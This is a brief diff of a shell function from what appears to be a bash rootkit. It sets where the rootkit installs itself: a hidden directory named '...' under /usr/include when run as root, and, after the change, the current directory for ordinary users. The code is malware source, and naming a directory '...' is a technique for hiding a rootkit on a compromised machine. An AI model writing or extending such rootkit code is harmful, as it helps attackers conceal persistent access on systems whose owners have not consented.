@@ -7,7 +7,7 @@ function br_set_rootkit_path()
         if [ $UID -eq 0 -o $EUID -eq 0 ]; then
 		BR_ROOTKIT_PATH="/usr/include/..."
 	else
-                BR_ROOTKIT_PATH="/home/$USER/..."
+                BR_ROOTKIT_PATH="$(pwd)/"
 	fi
 }
 
